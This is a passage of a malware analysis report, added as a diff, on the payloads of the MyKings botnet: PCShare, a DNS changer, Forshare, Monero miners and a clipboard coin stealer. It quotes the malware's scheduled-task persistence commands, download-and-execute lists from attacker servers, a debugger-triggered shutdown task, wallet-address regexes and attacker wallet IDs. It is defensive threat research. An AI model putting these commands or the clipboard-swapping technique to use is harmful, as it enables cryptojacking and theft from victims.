@@ -1,0 +1,526 @@
+Payloads
+The botnet delivers several components to the infected systems. The most important ones are covered
+in the following sections.
+PCShare
+This payload was frequently used during the early activities of the botnet, and occasionally it appears
+even nowadays.
+On infected systems this fragment form c3.bat registers the PCShare Trojan for automatic execution as a
+scheduled task:
+```
+  schtasks /create /tn "Mysa1" /tr "rundll32.exe
+  c:\windows\debug\item.dat,ServiceMain aaaa" /ru "system" /sc onstart /F
+```
+Contains references to source code files that are referred in as PCShare source code
+```
+  .\MyClientMain.cpp
+  .\MyClientTran.cpp
+  .\MyMainFunc.cpp
+  .\MyMainTrans.cpp
+  .\PcMain.cpp
+```
+A publication by Antiy researchers related the MyKings Trojan derived from the PCShare open source
+project.
+This source code was published in Github and advertised in a Chinese forum.
+32
+DNSChanger
+This Trojan is a simple downloader that performs the usual update mechanism driven by the download
+config file, but additionally modifies the DNS server settings.
+Typical version info of these files is:
+```
+Product Orgs ps
+Original name ps.exe
+Internal name My
+File version 1.0.0.1
+Description My
+```
+Changes the DNS server list to one of the following, depending on the actual variant:
+```
+  223.5.5.5,8.8.8.8
+  114.114.114.114,8.8.8.8
+```
+223.5.5.5 is part of the AliDNS a DNS recursive resolution system for China launched by the Alibaba
+Group. 114.114.114.114 is a free DNS also in China. The purpose for the addition of these DNS servers is
+not clear.
+The Trojan downloads /ok/ups.html from the current download servers.
+The content of the file is an IP address like:
+```
+  66.117.6.174
+```
+After that downloads two files from this IP address, update.txt and ver.txt .
+ver.txt contains the version number, which for the latest analyzed case was 1.0.0.9, other common
+version numbers were 1.0.0.1 and 1.0.0.8
+The content of the file is update.txt is:
+```
+hxxp://66.117.6[.]174/wpd.jpg c:\windows\system\msinfo.exe
+hxxp://66.117.6[.]174/my1.html c:\windows\system\my1.bat
+```
+msinfo.exe is the SQL brute forcing application, which will be registered as a service with the command:
+```
+config xWinWpdSrv binpath= "c:\windows\system\msinfo.exe -s -syn
+```
+This command line starts the tool in network discovery mode, it will perform a mass port scan on the
+local network.
+Then starts the service with the command
+```
+/c sc start xWinWpdSrv&ping 127.0.0.1 -n 10 && del
+```
+Dloadr
+These are Nullsoft Installer archives. They don't contain embedded malicious components, only the
+malicious installation script is executed which downloads and installs the further components.
+Typically, they download three further components, as in the following example:
+
+
+buff2.dat: the coin stealer
+
+
+VID.dat: xmrig cryptominer
+
+
+dhelper.dat: Neksminer cryptominer
+
+
+33
+All three components are delivered in password protected WinRAR SFX archives, and the NSIS installer
+script provides the required password, as highlighted on the previous picture.
+Forshare
+This Trojan is the most common payload delivered to the infected computers.
+The version information of the executables usually contains Chinese text:
+Translation:
+```
+  CompanyName: TODO: 
+  FileDescription: TODO: 
+  ProductName: TODO: 
+```
+34
+Not a very creative way to leave these fields at default “fill in the blanks” values. These are the values in
+all variants, except the FileVersion/ProductVersion which was 1.0.0.1 in the older versions and 1.0.0.9 in
+the latest ones. This value is used as version information when checking for updates.
+The Trojan behaves in many ways like a “normal” application, even provides a simple help:
+Some variants of the backdoor are debug built and display status messages on the console during
+execution.
+The undocumented -g command line switch provided a more verbose logging:
+The samples contain an internal version information. This has nothing to do with the version number
+used in the updating process.
+The values that we found in samples are:
+```
+  ups2 V1.0.1
+  ups2 V1.0.2
+```
+35
+Many of the samples are debug built that contain source file name information. Most of the samples
+also contain PDB path. These are the observed values (the first being the most common used by both
+v1.0.1 and v1.0.2):
+```
+  D:\ups new2\Release\ups.pdb
+  G:\Document\SYN HYDRA\ups-new2\Release\ups.pdb
+```
+The samples contain the following hardcoded RSA public key:
+```
+  -----BEGIN RSA PUBLIC KEY----
+  MIGJAoGBAMrexeviSRCFYvplOhEC6wLL0qtv3CdsNThO/TZCP+bhtDakW3nN3I+Z
+  qRip7vroYKKKGHKgougCnKISLqWibkjyAlr/UIDtQ9KnfDSu9CMTXrRMGpGB5otL
+  qLhSKESWhUlCB8Iqqxu8jL/MtzibB8s/K0tQqvsf/YyWMynIULqVAgMBAAE=
+-----END RSA PUBLIC KEY----
+```
+This key is used to decrypt the content of the xpdown.dat file and other config files.
+The key is used at the start of execution to decrypt some data. If the decryption is not successful, an
+error message is logged to the console.
+We observed this in one case where the executable (SHA1:
+e1ff22fbd57687a349602fc7705ec5f53c627b54) contained a different RSA key, thus generating the error
+message above. This may have happened by mistake; this second key was not used in any other sample
+we analyzed.
+The Trojan uses a mutex to ensure that it is only running a single instance. We found the following
+mutex values in the analyzed samples:
+```
+  {25BA86C7-2583-4825-AB16-A5031FA1C22D}
+{30BA86C7-2583-4825-BC16-A5031FA1C22D}
+```
+If finds an already running instance, drops an error message and exits.
+```
+2019.09.13 06:54:43:798 Thread: [2688] [2282] FirstInstance failed
+```
+The Trojan can be executed as a service (with the -r command line switch). In this case it will register as
+a service with the name “ Windows Audio Control”
+36
+The service will be executed with the net start Windows Audio Control command.
+The Trojan contains a hardcoded download server list that it will use, for example:
+```
+  45.58.135.106
+103.95.28.54
+103.213.246.23
+74.222.14.61
+ok.mymyxmra.ru
+```
+This list is saved to the file C:\Program Files\Common Files\xpdown.dat .
+Later Forshare downloads xpdown.dat form the specified server list, decrypts the content, and saves it
+over the same location, which will now contain the updated server list in decrypted form.
+Checks the internet connectivity by attempting to load the website http://www.amazon.com . If it is
+successful, proceeds with downloading ver.txt from the servers in the download server list. This is a text
+file that only contains the version information, which was the following at the time of our analysis:
+```
+  1.0.0.8
+```
+If it matches the ProductVersion info from the PE file, then nothing happens, otherwise an update is
+downloaded.
+Goes through the server list and attempts to download up.rar from the server. It serves as an update for
+the Trojan.
+```
+  2019.09.13 07:49:27:749 Thread: [2644] [1434] check version begin
+  2019.09.13 07:49:32:667 Thread: [2644] [1441] access amazon success
+  2019.09.13 07:49:32:707 Thread: [2644] [1463] ver different web:1.0.0.8 local:,
+  needs update.
+  2019.09.13 07:49:32:747 Thread: [2644] [1551] download up.rar failed,continue...
+```
+If an update could be found, stops the running process and executes the downloaded update with the -C
+create -r command line:
+```
+/C ping 127.0.0.1 -n 6 & taskkill -f /im conime.exe /im ups2.exe & copy /Y "%s" "%s" & "%s" -C
+create -r
+```
+Here the strings are filled in with the downloaded new version's path and filename. Interestingly, it also
+stops the conime.exe process – possibly another process name sometimes used by the Trojan.
+```
+  2019.09.13 07:02:57:857 Thread: [1832] [72] cService::Create Calling:
+  C:\temp\ups2.exe -s
+  2019.09.13 07:02:57:927 Thread: [1832] [2595] Command [created] Executing
+  2019.09.13 07:03:27:960 Thread: [1832] [211] StartService failed,Error: 1053
+  2019.09.13 07:03:27:960 Thread: [1832] [2601] Service Start Failed£¬Return
+Value: 0x0000041D
+```
+The service waits for commands. The possible commands are:
+```
+  CONTROL_STOP
+  CONTROL_PAUSE
+  CONTROL_CONTINUE
+  CONTROL_INTERROGATE
+  CONTROL_SHUTDOWN
+```
+The Trojan starts a new thread that does the download of further components. This update mechanism,
+using the kill list and download list files is shared with other components of the MyKings botnet, for
+example the SQL brute forcing tool, the DNSChanger Trojan and some of the miner versions do the
+same.
+37
+This thread runs the update process every two hours.
+```
+2019.09.13 04:51:08:700 Thread: [3492] [2334] next check time is two hours
+```
+It attempts to download /ok/down.html from all of the servers in xpdown.dat . The content of this file is
+the address of the current download server.
+Downloads kill.txt from the server. This contains a kill list of executables that need to be removed:
+```
+  lsmose.exe,C:\Windows\debug\lsmose.exe,0
+  lsmos.exe,C:\Windows\debug\lsmos.exe,1
+  lsmo.exe,C:\Windows\debug\lsmo.exe,1
+  conime.exe,C:\Program Files (x86)\Common Files\conime.exe,1
+  lsmosee.exe,c:\windows\help\lsmosee.exe,1
+  severxxs.exe,C:\Windows\Temp\severxxs.exe,1
+  mssecsvc.exe,c:\windows\mssecsvc.exe,1
+  mssecsvr.exe,c:\windows\mssecsvr.exe,1
+  dsbws.exe,c:\windows\syswow64\dsbws.exe,1
+```
+Each entry has the process name, the file path and a flag that indicates whether the process itself has to
+be stopped. This is handled by the Trojan accordingly:
+```
+  2019.09.13 06:35:16:500 Thread: [3512] [1551] no need kill proc:
+  lsmose.exe,file: C:\Windows\debug\lsmose.exe
+  2019.09.13 06:35:16:500 Thread: [3512] [1551] need kill proc: lsmos.exe,file:
+  C:\Windows\debug\lsmos.exe
+  2019.09.13 06:35:16:500 Thread: [3512] [1551] need kill proc: lsmo.exe,file:
+  C:\Windows\debug\lsmo.exe
+  2019.09.13 06:35:16:500 Thread: [3512] [1551] need kill proc: conime.exe,file:
+  C:\Program Files (x86)\Common Files\conime.exe
+  2019.09.13 06:35:16:500 Thread: [3512] [1569] delete C:\Program Files
+  (x86)\Common Files\conime.exe failed,dwRet: 2
+  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: lsmosee.exe,file:
+  c:\windows\help\lsmosee.exe
+  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: severxxs.exe,file:
+  C:\Windows\Temp\severxxs.exe
+  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: mssecsvc.exe,file:
+  c:\windows\mssecsvc.exe
+2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: mssecsvr.exe,file:
+  c:\windows\mssecsvr.exe
+2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: dsbws.exe,file:
+  c:\windows\syswow64\dsbws.exe
+  2019.09.13 06:35:21:507 Thread: [3512] [1569] delete
+  c:\windows\syswow64\dsbws.exe failed,dwRet: 2
+```
+Then downloads down.txt form the server (some versions use additionally downs.txt as well). It contains
+the list of additional modules:
+```
+  hxxp://185.112.156[.]92/down.exe C:\windows\system\down.exe 0
+  hxxp://174.128.249[.]18/item.rar C:\windows\debug\item.dat 0
+  hxxp://150.107.76[.]231/2.exe c:\windows\inf\msiefs.exe 1
+  hxxp://174.128.249[.]18/64work.rar c:\windows\inf\lsmm.exe 1
+```
+The entries contain the URL, the local file name where it has to be saved and a flag to indicate whether
+it should be executed.
+The Trojan then processes this list.
+```
+  2019.09.13 06:35:26:544 Thread: [3512] [1949] no need execute url:
+  http://185.112.156[.]92/downs.exe,file: C:\windows\system\downs.exe
+  2019.09.13 06:35:26:594 Thread: [3512] [1954] http download
+  hxxp://185.112.156[.]92/downs.exe failed
+  2019.09.13 06:35:26:594 Thread: [3512] [1949] no need execute url:
+```
+38
+```
+  hxxp://174.128.249[.]18/item.rar,file: C:\windows\debug\item.dat
+  2019.09.13 06:35:30:209 Thread: [3512] [1954] http download
+  hxxp://174.128.249[.]18/item.rar success
+  2019.09.13 06:35:30:209 Thread: [3512] [1949] need execute url:
+  hxxp://150.107.76[.]231/2.exe,file: c:\windows\inf\msiefs.exe
+  2019.09.13 06:35:31:0 Thread: [3512] [1954] http download
+  hxxp://150.107.76[.]231/2.exe failed
+```
+Some of the Forshare versions contain additional code specific to download miners and their
+dependencies.
+Those access vers1.txt that has the typical content:
+```
+64.rar 5.1.2600.5512 (xpsp.080413-2105)
+```
+Downloads the file to one of the following locations:
+```
+  c:\windows\system32\drivers\64.exe
+  c:\windows\debug\lsmose.exe
+```
+The following dependencies (XMR miner related DLLs) are also downloaded from the server:
+```
+  xmrstak_cuda_backend.dll
+  xmrstak_opencl_backend.dll
+  pthreadVC2.dll
+  cudart32_65.dll
+```
+Without these DLLs the miner could not work.
+Miners
+The main point of building up the MyKings botnet was to deliver Monero coin miners to the infected
+computers. During the lifetime of the botnet several different miner programs were used and a handful
+of different wallets were collecting the crypto currency.
+Some of the miners are based on the ccminer project and require the additional download of
+cudart32_65.dll and pthreadVC2.dll:
+These miners may contain the PDB path:
+```
+  D:\src\cn\Release\ccminer.pdb
+```
+These were most likely executed with the appropriate command line switches to connect to the mining
+server:
+```
+  -O, --userpass=U:P  username:password pair for mining server\n\
+  -u, --user=USERNAME  username for mining server\n\
+  -p, --pass=PASSWORD  password for mining server\n\
+```
+These miners were named downloaded with the file name cc.rar by some of the Forshare variants.
+39
+The largest group miners are based on the xmr-stak project.
+These require the download of additional dlls:
+```
+  cudart32_65.dll
+  pthreadVC2.dll
+  xmrstak_cuda_backend.dll
+  xmrstak_opencl_backend.dll
+```
+These were typically downloaded along with the miners during the installation phase. Or, in other cases,
+the miner was packaged into a self-extracting RAR archive along with the dependencies, set to execute
+the miner automatically on unpacking:
+This miner requires the presence of at least two CPUs in the system. It is a common anti-emulation trick
+by malware to check the number of processors, but in this case, the purpose is not for evading analysis,
+but for ensuring that there is enough computing power to consume.
+```
+
+XMR mining software, CPU-GPU Version.
+  You can use following keys to display reports:
+'h' - hashrate
+'r' - results
+'c' - connection
+
+cpu is less than 2, exit
+```
+This additional check is not present in the original source code of xmr-stak, could be an addition by the
+threat actors who used the publicly available source of this miner and made numerous enhancements
+to it, to implement additional required functionality, like the updating process.
+The xmr-stak based miners contain and use the same RSA key as the Forshare variants to decrypt the
+config data.
+The miners also contain a similar server list as the Forshare Trojan, for example:
+```
+  xmr.xmr5b.ru
+45.58.135.106
+103.213.246.23
+103.95.28.54
+```
+40
+```
+  74.222.14.97
+ok.mymyxmra.ru
+  54.255.141.50
+```
+Many of the variants contain a PDB path. The observed values were:
+```
+  D:\chighserver-xmr 20180311\Release\xmr.pdb
+  F:\chighserver-xmr\Release\xmr.pdb
+  H:\chighserver-xmr\Release\xmr.pdb
+  E:\open sources\xmrok\ 修改域名 \chighserver-xmr\Release\xmr.pdb
+```
+The translation of the Chinese text in the latter is: “Modify the domain name”.
+We have seen the following wallet ID to collect the mined coins:
+```
+  47Tscy1QuJn1fxHiBRjWFtgHmvqkW71YZCQL33LeunfH4rsGEHx5UGTPdfXNJtMMATMz8bmaykGVuDFG
+  WP3KyufBSdzxBb2
+```
+Another large group were the xmrig miners. These are typically delivered in NSIS self-installing archives,
+that contains both the 32- and 64-bit versions of the miner:
+Then the script executes the miner executable, feeding the criminal's wallet ID as a command line
+parameter:
+The latest in the long line of miner variations, the one that at the time of writing this paper is currently
+used, are 64-bit xmrig variant.
+41
+Version: (the version numbers in the PE properties are different from the version info in the source):
+```
+  XMRig 2.14.1
+  built on Mar 9 2019 with MSVC
+features: 64-bit AES
+```
+Miner info:
+```
+  "url": "sg.minexmr.com:3333",
+"user":
+"431rnEmM7kRhQZpUg1BcUqJYZv3PFMm72D1nNVPD6KguSadJbaq2H1QgCPgfb4ioxQas2Dy7ea7rsa8
+  gUCkkdvQGTZYE5tZ",
+  "pass": "x",
+```
+This account has been suspended for botnet activity (this usually happens with all of the wallet IDs used
+by the botnet):
+However, this account was transferred to a different server, where it is (at the time of writing this
+paper) still active, and has collected about 200 XMR (US$10,400):
+This account is the currently known, latest active wallet used by the MyKings botnet.
+CoinStealer
+One of the less common payloads is a coin stealer Trojan.
+On execution it checks for the mutex to avoid multiple executions:
+```
+  Windows 7 Professional02
+```
+And then it contacts two URLs. The first address is hxxp://2no[.]co/1Lan77, redirecting
+to hxxps://iplogger[.]org/1Lan77 . The purpose is likely to track infections.
+The second contacted URL is hxxp://ioad[.]pw/ioad.exe which points to an NSIS downloader, just like
+the ones described in the Dloadr section.
+The stealer uses several regular expressions that match wallet addresses for a wide selection of
+cryptocurrencies:
+42
+```
+  ^[13][a-zA-Z0-9]{99,99}$ - Bitcoin
+  ^B[a-zA-Z0-9]{32,36}$ - BlackCoin
+  ^[13][a-zA-Z0-9]{26,33}$ - Bitcoin, ByteCoin
+  ^E[a-zA-Z0-9]{32,36}$ - EmerCoin
+  ^q[a-zA-Z0-9]{40,42}$ - Bitcoincash
+  ^R[a-zA-Z0-9]{32,36}$ - ReddCoin
+  ^r[a-zA-Z0-9]{32,36}$ - Ripple
+  ^A[a-zA-Z0-9]{29,40}$ - Neo
+  ^[0][x][a-zA-Z0-9]{25,45}$ - Ethereum, Electroneum
+  ^[Xx][a-zA-Z0-9]{25,50}$ - Dash
+  ^[Dd][a-zA-Z0-9]{25,45}$ - Dogecoin
+  ^[0][x][a-zA-Z0-9]{99,99}$ - Ethereum
+  ^L[a-zA-Z0-9]{26,33}$ - Litecoin
+  ^[4][a-zA-Z0-9]{80,130}$ - XMR
+  ^[tzTZ][a-zA-Z0-9]{25,45}$ - Zcash
+  ^[R][0-9]{12,15}$ - WMR
+  ^[U][0-9]{12,15}$ - WMU
+  ^[X][0-9]{12,15}$ - WMX
+  ^[G][0-9]{12,15}$
+  ^[E][0-9]{12,15}$ - WME
+  ^[Z][0-9]{12,15}$ - WMZ
+  ^Y[a-zA-Z0-9]{89,92}$ - Miota
+  ^D[a-zA-Z0-9]{103,105}$ - Cardano
+  ^[0-9]{19,22}L$ - Lisk
+  ^S[a-zA-Z0-9]{31,35}$ - Stratis
+  ^3P[a-zA-Z0-9]{32,36}$ - Waves
+  ^Q[a-zA-Z0-9]{32,36}$ - Qtum, ReddCoin
+  ^G[a-zA-Z0-9]{54,57}$ - Stellar
+  ^V[a-zA-Z0-9]{32,36}$ - Viacoin
+  G[a-zA-Z0-9]{104,107}$ - Graft
+  ^41991[a-zA-Z0-9]{7,12}$ - YaMoney
+```
+And some other search expressions matching web services like Google, Steam, Vkontakte (a popular
+social media site in Russia):
+Additionally the Trojan keeps a list of wallet addresses most likely belonging to the criminals. The XMR
+wallet ID
+( 41xDYg86Zug9dwbJ3ysuyWMF7R6Un2Ko84TNfiCW7xghhbKZV6jh8Q7hJoncnLayLVDwpzbPQPi62bvPqe
+6jJouHAsGNkg2 ) was used in the Photominer campaigns, we think that the others could belong to the
+MyKings botnet as well. The list of own wallet IDs is the following:
+43
+|Currency|Wallet|
+|---|---|
+|Bitcoincash|qrfdnklvpgmh94dycdsp68qd6nf9fk8vlsr24n2mcp|
+|ByteCoin|12cZKjNqqxcFovghD5N7fgPNMLFZeLZc3u|
+|EmerCoin|EVRzjX4wpeb9Ys6i1LFcZyTkEQvV9Eo2Wk|
+|BlackCoin|JDi6PaWXd3yQ167tqShDxZcLEx3aRRSii|
+|ReddCoin|QrKfx3qsqaMQUVHx8yAd1aTHHRdjP6Tg|
+|Currency|Wallet|
+|---|---|
+|Ripple|rNoeET6PH5dkf1VVvuUc2eZYap9yDZiKTm|
+|Dash|Xup4gBGLZLDi9J9VbcLuRHGKDXaUjwMoZV|
+|Dogecoin|D6nziu2uAoiWvdjRYRPH7kedgzh56Xkjjv|
+|Ethereum|0x039fd537a61e4a7f28e43740fe29ac84443366f6|
+|Litecoin|LUfdGb4pCzTAq9wucRpZZgCF69QHpAgvfE|
+|XMR|41xDYg86Zug9dwbJ3ysuyWMF7R6Un2Ko84TNfiCW7xghhbKZV6jh8Q7hJoncnLayLVDwpzbPQPi62bvPqe6jJouHAsGNkg2|
+|Zcash|t1JjREG9k58srT42KitRp3GyMBm2x4B889o|
+|Ethereum|0x6a1A2C1081310a237Cd328B5d7e702CB80Bd2078|
+|Iota|SVEBXIOJELVYBRULCLMQUYFHCPNJ9TWRDMFWMEDBEOQRO9MBO9VXMXYEBV9NUVFGGQDRDFUSKOQHOYFBWGXDKTGSDB|
+|Cardano|DdzFFzCqrht9wkicvUx4Hc4W9gjCbx1sjsWAie5zLHo2K2R42y2zvA7W9S9dM9bCHE7xtpNriy1EpE5xwv7mPuSjhP4FyB9Z1ra6Ge3y|
+|Lisk|7117094708328086084L|
+|Stratis|SPLfNnmUdqmYu1FH2qMcGiU7P8Mwf9Z3Kr|
+|Waves|3PAFMSCjWpf5WDxkkECMmwqkZGHySgpuzEo|
+|Qtum|QNkbMtCmWSCFS1U63PcAxhKufLvEwSsJ8t|
+|Stellar|GBJOA4BNCXBSYG3ZVU2GXNOOA2JJLCG4JIVNEINHQIZNVMX4SSH5LLK7|
+|Viacoin|VhGTEsM6ewqNBJwDEB2o6bHvRqFdGqu5HM|
+|Graft|G4qyAXyftgpRW4idTMWA7e7QnSN6DKUeGcbcqAQra3c46JRuYdzTRxwVAGYRCK9U5WLncok7Loni73sm1TaWhbQ1DnAJKx5|
+|Neo|AKY1itrWtsmziQhg2THDcR3oJhXsVLRxM7|
+The malware examines the clipboard content using these regexes every 600 milliseconds. If the content
+matches one of the recognized coin wallet formats, the malware changes the value in the clipboard to
+the stored own wallet ID, generating an internal message:
+This message is set as user agent in a subsequent InternetOpenA call. The code suggests that the
+intention was to submit this data to a server, but the server name was left empty in the variants known
+to us.
+This method relies on the practice that most (if not all) people don't type in the long wallet IDs rather
+store it somewhere and use the clipboard to copy it when they need it. Thus, when they would initiate a
+payment to a wallet, and copy the address to the clipboard, the Trojan quickly replaces it with the
+criminals' own wallet, and the payment is diverted to their account.
+The same is supposed to happen with goo.gl and vk.cc addresses, but in those cases the replacement
+address is not defined, so it is not clear what is the intent of those searches.
+The Trojan periodically searches all of the window texts belonging to running program using two lists.
+The first contains system monitoring utilities:
+```
+  NetMonitor
+```
+44
+```
+  taskmgr.exe
+  Process Killer
+KillProcess
+System Explorer
+  Process Explorer
+AnVir
+Process Hacker
+Task Manager
+  Диспетчер
+```
+(The last element of the list corresponds to the Task Manager in Russian localized Windows versions.
+The second list consists of debuggers:
+```
+  OllyDbg
+IDA
+ImmunityDebugger
+  Dbg
+LordPE
+```
+If any of them is found running, the Trojan creates a task that is executed every minute and shuts down
+the computer:
+```
+  /create /sc minute /tn "7king hacker suck" /tr "cmd.exe /c shutdown -s -t 0
+```
+To establish persistence the coin stealer registers itself as a scheduled task with a command line
+(directory name is random):
+```
+  /create /sc minute /f /tn "Microsoft LocalManager[Windows 7 Professional]" /tr
+  "C:\ProgramData{70800304-7080-7080-708003041534}\lsm.exe", show_window =
+  SW_HIDE
+```
+Currently the coin addresses are not used or never received more than a few dollars, coin stealing
+doesn't look like the most profitable operation of MyKings.
